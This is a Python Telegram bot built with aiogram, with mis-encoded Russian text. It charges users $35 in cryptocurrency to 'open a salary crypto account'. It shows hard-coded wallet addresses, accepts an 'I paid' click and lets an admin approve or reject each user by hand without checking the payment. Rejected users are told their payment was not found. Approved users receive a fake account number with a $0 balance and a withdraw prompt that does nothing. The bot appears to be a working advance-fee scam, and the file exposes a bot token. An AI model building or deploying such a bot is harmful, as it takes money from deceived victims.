
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from random import randint

BOT_TOKEN = "8122510813:AAHOpgwNJqUWUhuo01Wl0FywRS40sBARhR0"
ADMIN_CHAT_ID = 7786764846
WALLETS = {
    "TRC20": "TQw19dGhSNeryY3eDX3byeD4KsThyNdCLU",
    "BEP20": "0x7a210fc89eccfaed2ea25cc27446e44743533ac2",
    "ERC20": "0x7a210fc89eccfaed2ea25cc27446e44743533ac2",
    "BTC": "1G7pG7WQwTvmmND9RgQFzkEQyuq9WAWeM3",
    "SOL": "3uUsgFUUUJLx5rYJ786rgcBozaxtFLvoSv1a2xvfbKrh"
}
OPENING_PRICE = 35
REDIRECT_URL = "https://forms.yandex.ru/u/65fc1552068ff006e9d03e05/"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
dp = Dispatcher(bot)

users = {}

def generate_account_id():
    return f"BW-{randint(1000000000000000, 9999999999999999)}"

@dp.message_handler(commands=["start"])
async def start_handler(message: types.Message):
    users[message.from_user.id] = {"status": "new"}
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("üßæ –û—Ç–∫—Ä—ã—Ç—å –∑–∞—Ä–ø–ª–∞—Ç–Ω—ã–π —Å—á—ë—Ç ‚Äî $35", callback_data="open")
    )
    await message.answer("–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å! –ù–∞–∂–º–∏—Ç–µ, —á—Ç–æ–±—ã –æ—Ç–∫—Ä—ã—Ç—å –∑–∞—Ä–ø–ª–∞—Ç–Ω—ã–π –∫—Ä–∏–ø—Ç–æ—Å—á—ë—Ç:", reply_markup=keyboard)

@dp.callback_query_handler(lambda c: c.data == "open")
async def open_wallet(callback: types.CallbackQuery):
    keyboard = InlineKeyboardMarkup(row_width=2)
    for net in WALLETS:
        keyboard.insert(InlineKeyboardButton(net, callback_data=f"network:{net}"))
    await callback.message.edit_text("–í—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ç—å –¥–ª—è –æ–ø–ª–∞—Ç—ã:", reply_markup=keyboard)

@dp.callback_query_handler(lambda c: c.data.startswith("network:"))
async def show_wallet(callback: types.CallbackQuery):
    net = callback.data.split(":")[1]
    wallet = WALLETS[net]
    users[callback.from_user.id] = {"status": "awaiting_payment", "network": net}
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("‚úÖ –Ø –æ–ø–ª–∞—Ç–∏–ª", callback_data="paid")
    )
    await callback.message.edit_text(
        f"üí∞ –û—Ç–ø—Ä–∞–≤—å—Ç–µ <b>${OPENING_PRICE}</b> –Ω–∞ –∞–¥—Ä–µ—Å –≤ —Å–µ—Ç–∏ <b>{net}</b>:
<code>{wallet}</code>

–ü–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == "paid")
async def paid(callback: types.CallbackQuery):
    user = callback.from_user
    data = users.get(user.id, {})
    if data.get("status") != "awaiting_payment":
        return await callback.answer("–°–Ω–∞—á–∞–ª–∞ –≤—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ç—å –∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –ø–ª–∞—Ç—ë–∂.")
    network = data.get("network", "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", callback_data=f"confirm:{user.id}"),
        InlineKeyboardButton("‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", callback_data=f"cancel:{user.id}")
    )
    await bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"üí∏ –ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –Ω–∞ –æ—Ç–∫—Ä—ã—Ç–∏–µ —Å—á—ë—Ç–∞

üë§ @{user.username or user.id}
–°–µ—Ç—å: {network}

–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–ª–∞—Ç—ë–∂?",
        reply_markup=keyboard
    )
    await callback.message.edit_text("‚è≥ –û–∂–∏–¥–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞...")

@dp.callback_query_handler(lambda c: c.data.startswith("confirm:"))
async def confirm(callback: types.CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    acc_id = generate_account_id()
    users[user_id]["account_id"] = acc_id
    users[user_id]["balance"] = 0
    users[user_id]["status"] = "active"
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("üí∏ –í—ã–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞", callback_data="withdraw")
    )
    await bot.send_message(
        chat_id=user_id,
        text=f"‚úÖ –í–∞—à –∑–∞—Ä–ø–ª–∞—Ç–Ω—ã–π —Å—á—ë—Ç –æ—Ç–∫—Ä—ã—Ç!
–ù–æ–º–µ—Ä —Å—á—ë—Ç–∞: <code>{acc_id}</code>
–ë–∞–ª–∞–Ω—Å: $0.00",
        reply_markup=keyboard
    )
    await callback.message.edit_text("‚úÖ –°—á—ë—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥—ë–Ω")

@dp.callback_query_handler(lambda c: c.data.startswith("cancel:"))
async def cancel(callback: types.CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    await bot.send_message(
        chat_id=user_id,
        text="‚ùå –û–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫—É. –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –Ω–µ —É–¥–∞—ë—Ç—Å—è –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –≤–∞—à –ø–ª–∞—Ç—ë–∂. –ù–∞–ø–∏—à–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤ Telegram: @secondlang_support"
    )
    await callback.message.edit_text("‚õîÔ∏è –û—Ç–∫–ª–æ–Ω–µ–Ω–æ")

@dp.callback_query_handler(lambda c: c.data == "withdraw")
async def withdraw(callback: types.CallbackQuery):
    await callback.message.answer("üí∏ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –∏ —Å–ø–æ—Å–æ–± –≤—ã–≤–æ–¥–∞:
–ü—Ä–∏–º–µ—Ä:
<code>100 USDT –Ω–∞ –∫–∞—Ä—Ç—É ****1234</code>")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
